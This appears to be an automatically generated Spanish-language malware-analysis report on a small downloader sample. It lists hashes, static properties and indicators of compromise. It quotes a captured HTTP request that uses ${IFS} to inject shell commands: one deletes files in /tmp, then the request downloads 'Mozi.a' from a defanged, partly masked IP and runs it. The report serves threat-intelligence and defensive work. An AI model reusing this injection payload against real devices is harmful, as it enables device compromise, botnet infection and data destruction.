# 🧬 Payload Analysis

`4f503227e379ec0485975fe35a48b2f7248b29bccd87c348b7dcda7724551dce`

## 📌 Resumen

Texto ASCII de 161 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.a` en `hxxp://223.123.71.XXX:34975/Mozi.a`. Se dispone de 1 comando observado o extraído. Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/4f503227e379ec0485975fe35a48b2f7248b29bccd87c348b7dcda7724551dce.md](../../../../../malware-like/oraculo/downloader/4f503227e379ec0485975fe35a48b2f7248b29bccd87c348b7dcda7724551dce.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:43:29.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `4f503227e379ec0485975fe35a48b2f7248b29bccd87c348b7dcda7724551dce`
- **MD5:** `ca9125bac7fd6e0a0ee7578f8cec5140`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 161 B |
| Entropía | 5.32 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://223.123.71.XXX:34975/Mozi.a;sh${IFS}/tmp/Mo
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://223.123.71.XXX:34975/Mozi.a;sh$ | strings |
| ip | 223.123.71.XXX | static_analysis |
| command | GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://223.123.71.XXX:34975/Mozi.a;sh${IFS}/tmp/Mo | strings |
| hash | 4f503227e379ec0485975fe35a48b2f7248b29bccd87c348b7dcda7724551dce | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
